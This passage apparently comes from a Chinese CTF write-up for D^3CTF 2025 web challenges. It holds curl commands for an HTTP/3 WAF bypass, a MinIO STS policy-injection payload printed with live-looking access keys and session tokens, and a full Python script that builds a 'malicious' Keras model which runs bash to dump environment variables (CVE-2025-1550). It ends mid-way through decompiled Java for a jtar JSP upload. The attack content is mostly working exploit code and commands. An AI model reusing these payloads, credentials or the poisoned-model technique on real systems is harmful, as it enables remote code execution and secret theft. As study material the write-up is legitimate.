punctuation">.</span><span class="token function">HasPrefix</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"I want"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"Sorry I'm not clear what you want."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span>item <span class="token operator">:=</span> bytes<span class="token punctuation">.</span><span class="token function">TrimSpace</span><span class="token punctuation">(</span>bytes<span class="token punctuation">.</span><span class="token function">TrimPrefix</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"I want"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> bytes<span class="token punctuation">.</span><span class="token function">Equal</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">type</span> wrap <span class="token keyword">struct</span> <span class="token punctuation">{</span>io<span class="token punctuation">.</span>ReadCloserban <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span>idx <span class="token builtin">int</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>w <span class="token operator">*</span>wrap<span class="token punctuation">)</span> <span class="token function">Read</span><span class="token punctuation">(</span>p <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>n<span class="token punctuation">,</span> err <span class="token operator">:=</span> w<span class="token punctuation">.</span>ReadCloser<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>errors<span class="token punctuation">.</span><span class="token function">Is</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> io<span class="token punctuation">.</span>EOF<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> n<span class="token punctuation">,</span> err<span class="token punctuation">}</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span><span class="token keyword">if</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> w<span class="token punctuation">.</span>ban<span class="token punctuation">[</span>w<span class="token punctuation">.</span>idx<span class="token punctuation">]</span> <span class="token punctuation">{</span>w<span class="token punctuation">.</span>idx<span class="token operator">++</span><span class="token keyword">if</span> w<span class="token punctuation">.</span>idx <span class="token operator">==</span> <span class="token function">len</span><span class="token punctuation">(</span>w<span class="token punctuation">.</span>ban<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> n<span class="token punctuation">,</span> ErrWAF<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>w<span class="token punctuation">.</span>idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">return</span> n<span class="token punctuation">,</span> err<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">textInterrupterWrap</span><span class="token punctuation">(</span>rc io<span class="token punctuation">.</span>ReadCloser<span class="token punctuation">)</span> io<span class="token punctuation">.</span>ReadCloser <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token operator">&amp;</span>wrap<span class="token punctuation">{</span>rc<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>HTTP/3 要求使用 HTTPS（TLS 加密）</li><li>只有 HTTPS 才能启用 HTTP/3 协议</li><li>HTTP/3 默认使用 QUIC 协议，而 QUIC 协议底层已经基于 UDP</li></ul></blockquote><p>buf缓存复用，用完缓存后没有清除而是放进了公共池，然后是根据请求长度来获取缓存</p><pre class="line-numbers language-none"><code class="language-none">item := bytes.TrimSpace(bytes.TrimPrefix(buf, []byte("I want")))if bytes.Equal(item, []byte("flag")) {buf = p.Get(length)defer p.Put(buf)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以通过设置 Content-Length 来填充上次请求的buf缓存内容，然后检测waf是检测的请求内容，获取flag是看的buf，从而进行绕过</p><pre class="line-numbers language-none"><code class="language-none">curl --http3 -k -v https://35.241.98.126:30830   Hello D^3CTF 2025,I'm tidy quic in web. curl --http3 -k -v -X POST https://35.241.98.126:30830      Sorry I'm not clear what you want. curl --http3 -k -v -X POST https://35.241.98.126:30830 -d "I want flag"   WAF  curl --http3 -k -v -X POST https://35.241.98.126:30830 -d 'I want \0flag'x=$'I want   ag'curl -X POST https://35.241.98.126:30830 -d "$x" -v --insecure --http3 -H "Content-Length: 11" x=$'I want fl  'curl -X POST https://35.241.98.126:30830 -d "$x" -v --insecure --http3 -H "Content-Length: 11" curl -k --http3 -X POST https://35.241.98.126:31100 --data "I want" -H "Content-Length: 11"curl -k --http3 -X POST https://35.241.98.126:31100 --data "I want flag" -H "Content-Length: 11"curl -k --http3 -X POST https://35.241.98.126:31100 --data "I want" -H "Content-Length: 11"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="d3invitation"><a href="#d3invitation" class="headerlink" title="d3invitation"></a>d3invitation</h3><p><a href="https://stevenocean.github.io/2021/01/12/minio-sts-assumerole-sample.html">https://stevenocean.github.io/2021/01/12/minio-sts-assumerole-sample.html</a></p><p><a href="https://forum.butian.net/share/4340">https://forum.butian.net/share/4340</a></p><pre class="line-numbers language-none"><code class="language-none">{  "access_key_id": "GGQAD3S7AQV2CHW6FIWK",  "secret_access_key": "dUBCb6NEb+SQ++eaOxHLqf7nuf+5sq2Hnb+BFszW",  "session_token": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJHR1FBRDNTN0FRVjJDSFc2RklXSyIsImV4cCI6MTc0ODcwMzMwMiwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2TWk1cWNHY2lYWDFkZlE9PSJ9.e5_4cry-b2AEx8W4BHStRMe_XLmPNHN1V_T06lEKhRJ_D5kLPHlbahY7-5oYiUzV0-DeHCyXxAfFRN5XXq7DpA"}{"alg":"HS512","typ":"JWT"}.{"accessKey":"GGQAD3S7AQV2CHW6FIWK","exp":1748703302,"parent":"B9M320QXHD38WUR2MIY3","sessionPolicy":"eyJWZXJzaW9uIjoiMjAxMi0xMC0xNyIsIlN0YXRlbWVudCI6W3siRWZmZWN0IjoiQWxsb3ciLCJBY3Rpb24iOlsiczM6R2V0T2JqZWN0IiwiczM6UHV0T2JqZWN0Il0sIlJlc291cmNlIjpbImFybjphd3M6czM6OjpkM2ludml0YXRpb24vMi5qcGciXX1dfQ=="}.e5_4cry-b2AEx8W4BHStRMe_XLmPNHN1V_T06lEKhRJ_D5kLPHlbahY7-5oYiUzV0-DeHCyXxAfFRN5XXq7DpA{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["s3:GetObject","s3:PutObject"],"Resource":["arn:aws:s3:::d3invitation/2.jpg"]}]}{"object_name":"*\",\"arn:aws:s3:::*"}{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["s3:GetObject","s3:PutObject"],"Resource":["arn:aws:s3:::*","arn:aws:s3:::d3invitation/*"]}]}可以尝试构造一个特殊的object_name对policy进行注入，拿到一个对MinIO拥有所有权限的STS临时凭证{"object_name":"*\"]},{\"Effect\":\"Allow\",\"Action\":[\"s3:*\"],\"Resource\":[\"arn:aws:s3:::*"} "access_key_id":"NPO9XN9GE4MITLK9WCBB","secret_access_key":"KYOdEREHpVOnP2FCkxRn33vGL3azYoSyAUfY+U6R","session_token":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJOUE85WE45R0U0TUlUTEs5V0NCQiIsImV4cCI6MTc0ODg3NDgxNiwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2S2lKZGZTeDdJa1ZtWm1WamRDSTZJa0ZzYkc5M0lpd2lRV04wYVc5dUlqcGJJbk16T2lvaVhTd2lVbVZ6YjNWeVkyVWlPbHNpWVhKdU9tRjNjenB6TXpvNk9pb2lYWDFkZlE9PSJ9.UVopT0BZzvHVLUIIofPpaPrBSEgf7U75ZHxAG_dr-iZXORS5fs8FvE6QZWqpBvC28E_VyIHGIrbC8TztFmJoMQ"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><pre class="line-numbers language-none"><code class="language-none">wget https://dl.min.io/client/mc/release/linux-amd64/mcchmod +x mcsudo mv mc /usr/local/bin/export MC_HOST_youralias="http://yourserveraddress:9000 youraccesskey yoursecretkey"mc ls youraliasmc ls youralias/yourbucketnamemc cat youralias/yourbucketname/yourobjectname<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><pre class="line-numbers language-none"><code class="language-none">export MC_HOST_d3invitation="http://NPO9XN9GE4MITLK9WCBB:KYOdEREHpVOnP2FCkxRn33vGL3azYoSyAUfY+U6R:eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJOUE85WE45R0U0TUlUTEs5V0NCQiIsImV4cCI6MTc0ODg3NDgxNiwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2S2lKZGZTeDdJa1ZtWm1WamRDSTZJa0ZzYkc5M0lpd2lRV04wYVc5dUlqcGJJbk16T2lvaVhTd2lVbVZ6YjNWeVkyVWlPbHNpWVhKdU9tRjNjenB6TXpvNk9pb2lYWDFkZlE9PSJ9.UVopT0BZzvHVLUIIofPpaPrBSEgf7U75ZHxAG_dr-iZXORS5fs8FvE6QZWqpBvC28E_VyIHGIrbC8TztFmJoMQ@35.241.98.126:31110"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/733895f81f1994c716e3d52846d19967.png"></p><hr><h3 id="d3model"><a href="#d3model" class="headerlink" title="d3model"></a>d3model</h3><p><a href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models">https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> json<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> os<span class="token keyword">from</span> tensorflow<span class="token punctuation">.</span>keras<span class="token punctuation">.</span>models <span class="token keyword">import</span> Sequential<span class="token keyword">from</span> tensorflow<span class="token punctuation">.</span>keras<span class="token punctuation">.</span>layers <span class="token keyword">import</span> Densemodel_name <span class="token operator">=</span> <span class="token string">"model.keras"</span>x_train <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">28</span> <span class="token operator">*</span> <span class="token number">28</span><span class="token punctuation">)</span>y_train <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>model <span class="token operator">=</span> Sequential<span class="token punctuation">(</span><span class="token punctuation">[</span>Dense<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> activation<span class="token operator">=</span><span class="token string">'linear'</span><span class="token punctuation">,</span> input_dim<span class="token operator">=</span><span class="token number">28</span> <span class="token operator">*</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>optimizer<span class="token operator">=</span><span class="token string">'adam'</span><span class="token punctuation">,</span> loss<span class="token operator">=</span><span class="token string">'mse'</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> epochs<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>save<span class="token punctuation">(</span>model_name<span class="token punctuation">)</span><span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>model_name<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    config <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"config.json"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>config<span class="token punctuation">[</span><span class="token string">"config"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"layers"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"module"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"keras.models"</span>config<span class="token punctuation">[</span><span class="token string">"config"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"layers"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"class_name"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Model"</span>config<span class="token punctuation">[</span><span class="token string">"config"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"layers"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"config"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"mvlttt"</span><span class="token punctuation">,</span>    <span class="token string">"layers"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span>            <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"mvlttt"</span><span class="token punctuation">,</span>            <span class="token string">"class_name"</span><span class="token punctuation">:</span> <span class="token string">"function"</span><span class="token punctuation">,</span>            <span class="token string">"config"</span><span class="token punctuation">:</span> <span class="token string">"Popen"</span><span class="token punctuation">,</span>            <span class="token string">"module"</span><span class="token punctuation">:</span> <span class="token string">"subprocess"</span><span class="token punctuation">,</span>            <span class="token string">"inbound_nodes"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"args"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"env &gt; index.html"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"kwargs"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">"bufsize"</span><span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span>        <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"input_layers"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"mvlttt"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"output_layers"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"mvlttt"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>model_name<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zip_read<span class="token punctuation">:</span>    <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"tmp.</span><span class="token interpolation"><span class="token punctuation">{</span>model_name<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zip_write<span class="token punctuation">:</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> zip_read<span class="token punctuation">.</span>infolist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> item<span class="token punctuation">.</span>filename <span class="token operator">!=</span> <span class="token string">"config.json"</span><span class="token punctuation">:</span>                zip_write<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span>item<span class="token punctuation">,</span> zip_read<span class="token punctuation">.</span>read<span class="token punctuation">(</span>item<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>model_name<span class="token punctuation">)</span>os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"tmp.</span><span class="token interpolation"><span class="token punctuation">{</span>model_name<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> model_name<span class="token punctuation">)</span><span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>model_name<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zf<span class="token punctuation">:</span>    zf<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">"config.json"</span><span class="token punctuation">,</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Malicious model ready"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"config"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"layers"</span><span class="token operator">:</span> <span class="token punctuation">[</span>            <span class="token punctuation">{</span>                <span class="token property">"module"</span><span class="token operator">:</span> <span class="token string">"keras.models"</span><span class="token punctuation">,</span>                <span class="token property">"class_name"</span><span class="token operator">:</span><span class="token string">"Model"</span><span class="token punctuation">,</span>                <span class="token property">"config"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"layers"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">{</span>                    <span class="token property">"module"</span><span class="token operator">:</span> <span class="token string">"keras.models"</span><span class="token punctuation">,</span>                    <span class="token property">"class_name"</span><span class="token operator">:</span><span class="token string">"Model"</span><span class="token punctuation">,</span>                    <span class="token property">"config"</span><span class="token operator">:</span><span class="token punctuation">{</span>                        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"mvlttt"</span><span class="token punctuation">,</span> <span class="token property">"layers"</span><span class="token operator">:</span><span class="token punctuation">[</span>                            <span class="token punctuation">{</span>                                <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"mvlttt"</span><span class="token punctuation">,</span>                                <span class="token property">"class_name"</span><span class="token operator">:</span><span class="token string">"function"</span><span class="token punctuation">,</span>                                <span class="token property">"config"</span><span class="token operator">:</span><span class="token string">"Popen"</span><span class="token punctuation">,</span>                                <span class="token property">"module"</span><span class="token operator">:</span> <span class="token string">"subprocess"</span><span class="token punctuation">,</span>                                <span class="token property">"inbound_nodes"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token property">"args"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"env &gt; index.html"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"kwargs"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"bufsize"</span><span class="token operator">:</span><span class="token number">-1</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span>                            <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                <span class="token property">"input_layers"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"mvlttt"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                <span class="token property">"output_layers"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"mvlttt"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="d3jtar"><a href="#d3jtar" class="headerlink" title="d3jtar"></a>d3jtar</h3><p>不安全的jsp解析，显然只要成功上传jsp 文件即可RCE</p><blockquote><p>在使用 jtar 的 TarOutputStream 打包文件时，它会把文件名中的 unicode 强制转化为 ascii 码， 从而发生字符截断。</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//</span><span class="token comment">// Source code recreated from a .class file by IntelliJ IDEA</span><span class="token comment">// (powered by FernFlower decompiler)</span><span class="token comment">//</span><span class="token keyword">package</span> <span class="token namespace">d3<span class="token punctuation">.</span>example<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">d3<span class="token punctuation">.</span>example<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">BackUp</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">d3<span class="token punctuation">.</span>example<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">Upload</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Objects</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token 